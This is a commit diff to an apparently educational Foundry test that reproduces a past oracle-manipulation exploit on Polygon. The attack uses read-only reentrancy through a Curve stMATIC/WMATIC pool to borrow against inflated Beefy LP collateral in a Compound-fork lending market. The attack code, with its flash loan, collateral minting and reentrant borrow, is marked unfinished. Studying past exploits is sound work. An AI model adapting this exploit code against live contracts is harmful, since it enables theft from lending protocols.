2c9df9573401a13eb76c89561b99cf20757005ed
Joaquin L. Pereyra <joaquinlpereyra@gmail.com>
2022-12-15 11:37:39 -0300

    non-working-yet: curve pool oracle updates

--- test/Reentrancy/CurvePoolOracle/CurvePool.attack.sol
+++ test/Reentrancy/CurvePoolOracle/CurvePool.attack.sol
@@ -15,6 +15,23 @@ interface IUnitroller {
 
     // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
     function borrowCaps(address market) external view returns(uint256);
+    function getAccountLiquidity(address account) external view returns (uint, uint, uint);
+}
+
+interface IPriceFeed {
+    function getUnderlyingPrice(address cToken) external view returns (uint);
+}
+
+
+interface IVault is IERC20 {
+    function deposit(uint256) external;
+    function depositAll() external;
+    function withdraw(uint256) external;
+    function withdrawAll() external;
+    function getPricePerFullShare() external view returns (uint256);
+    function upgradeStrat() external;
+    function balance() external view returns (uint256);
+    function want() external view returns (IERC20);
 }
 
 interface ICERC20Delegator {
@@ -34,13 +51,34 @@ interface ICurvePool {
 }
 
 contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
+    // The tokens involved in the pool
     IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
     IERC20 stLIDOMATIC = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
-    ICERC20Delegator DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+
+    // Beefy delegators. Beefy is an Vault that wants LP_TOKENS from
+    // Curve pools.
+    ICERC20Delegator BEEFY_DELEGATOR = ICERC20Delegator(0x570Bc2b7Ad1399237185A27e66AEA9CfFF5F3dB8);
+    IVault BEEFY = IVault(0xE0570ddFca69E5E90d83Ea04bb33824D3BbE6a85);
+
+    // QIDAO Compound delegator and underlying
+    ICERC20Delegator QIDAO_DELEGATOR = ICERC20Delegator(0x3dC7E6FF0fB79770FA6FB05d1ea4deACCe823943);
+    IERC20 QIDAO = IERC20(0xa3Fa99A148fA48D14Ed51d610c367C61876997F1);
+
+    // Unitroller and price feed used by the unitroller. The attacker does not query
+    // the price (they might have precalculated the amounts) but is useful to
+    // generalize the test
+    IPriceFeed PRICE_FEED = IPriceFeed(0x71585E806402473Ff25eda3e2C3C17168767858a);
+    IUnitroller UNITROLLER = IUnitroller(0x627742AaFe82EB5129DD33D237FF318eF5F76CBC);
 
     // STLidoMatic/WMATIC Curve pool
     ICurvePool constant CURVE_POOL = ICurvePool(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
     IERC20 CURVE_LP_TOKEN = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
+
+    // Let's store the price of the LP tokens in different moments of the transaction
+    // To see how it goes up during the reentrancy and then comes back to normal
+    uint256 priceAtBeginning;
+    uint256 priceDuringCallback;
+    uint256 priceAfterCallback;
 
     // In reality, the attacker used some minion contracts which they deployed from their
     // main contract to execute the attacks. Here, we simplify and use only one contract
@@ -48,14 +86,14 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
     // The attacker minion address can be found at
     // https://polygonscan.com/address/0x8d1e7cE7DbB14aFB8782EaEa8010938cC457115e
     function setUp() external {
-        cheat.createSelectFork("polygon", 34716801); // We pin one block before the exploit happened.
+        cheat.createSelectFork("polygon", 34716800); // We pin one block before the exploit happened.
         cheat.label(address(this), "Attacker Contract");
         cheat.label(address(CURVE_POOL), "Curve Pool");
         cheat.label(address(CURVE_LP_TOKEN), "LP Token");
+        cheat.label(address(QIDAO_DELEGATOR), "QiDAO Delegator");
     }
 
     function test_attack() external {
-
         // In reality, the attacker requested a flash loan through AAVE
         // first and then through Balancer. This is not terribly important
         // for the attack, so it was left out for simplicity.
@@ -70,6 +108,9 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         _amounts[0] = 34580036532422811977431924;
         _amounts[1] = 19664260000000000000000000;
 
+        priceAtBeginning = get_lp_token_price_for_compound();
+        console.log("PRICE at beginnign");
+        console.log(priceAtBeginning);
         balancer.flashLoan(address(this), _tokens, _amounts, "");
     }
 
@@ -91,7 +132,28 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         // and finish
 
         console.log("STARTING BORROW");
-        DELEGATOR.borrow(249000000000000000000000);
+
+        (uint error, uint liquidity, uint shortfall) = UNITROLLER.getAccountLiquidity(address(this));
+        require(error == 0, "something happened");
+        require(shortfall == 0, "account underwater");
+        require(liquidity > 0, "account has excess collateral");
+
+
+        console.log(shortfall);
+        console.log(liquidity);
+
+
+        priceDuringCallback = get_lp_token_price_for_compound(); //
+        uint256 maxBorrowUnderlying = liquidity / priceDuringCallback;
+
+        console.log("PRICE at callback");
+        console.log(priceDuringCallback);
+        console.log(maxBorrowUnderlying);
+
+        console.log(address(BEEFY_DELEGATOR));
+        QIDAO_DELEGATOR.borrow(100);
+
+        console.log("borrow was ok");
     }
 
 
@@ -120,13 +182,46 @@ contract Exploit_QiProtocol_Through_Curve is TestHarness, BalancerFlashloan {
         uint256 lp_tokens = CURVE_POOL.add_liquidity(addLiquidityAmounts, 0, false);
 
         console.log(CURVE_LP_TOKEN.balanceOf(address(this)));
+        console.log(lp_tokens);
         assertGe(CURVE_LP_TOKEN.balanceOf(address(this)), 0);
+
+        // Now, our attacker will start a position on Compound
+        // the market is the delegator, and it will deposit
+        // LP tokens into beefy to be used as collateral
+
+        // enter the market
+        address[] memory markets = new address[](1);
+        markets[0] = address(BEEFY_DELEGATOR);
+        UNITROLLER.enterMarkets(markets);
+
+        // deposit into beefy
+        uint256 deposit_in_beefy = 90000000000000000000000;
+        CURVE_LP_TOKEN.approve(address(BEEFY), deposit_in_beefy);
+        BEEFY.deposit(deposit_in_beefy);
+
+        // mint collateral
+        uint256 amount_in_beefy = BEEFY.balanceOf(address(this));
+        BEEFY.approve(address(BEEFY_DELEGATOR), amount_in_beefy);
+        BEEFY_DELEGATOR.mint(amount_in_beefy);
+
+        // we have some lp tokens left over (we did not deposit everything in beefy)
+        // use those to remove liquidity from the curve pool and start the attack
+        uint256 lp_tokens_now = CURVE_LP_TOKEN.balanceOf(address(this));
 
         // Let's now remove liquidity, which will trigger our fallback function
         uint256[2] memory minAmounts = [ uint256(0) ,uint256(0) ];
-        CURVE_POOL.remove_liquidity(lp_tokens, minAmounts, true);
-        console.log("finished");
+        CURVE_POOL.remove_liquidity(lp_tokens_now, minAmounts, true);
+
+        priceAfterCallback = get_lp_token_price_for_compound();
+        console.log("PRICE after");
+        console.log(priceAfterCallback);
+        // console.log("finished");
 
     }
 
+    // Gets the price of Curve LP tokens (Beefy's underlying) according to the
+    // Compound price's feed
+    function get_lp_token_price_for_compound() internal view returns (uint256) {
+        return PRICE_FEED.getUnderlyingPrice(address(BEEFY_DELEGATOR));
+    }
 }
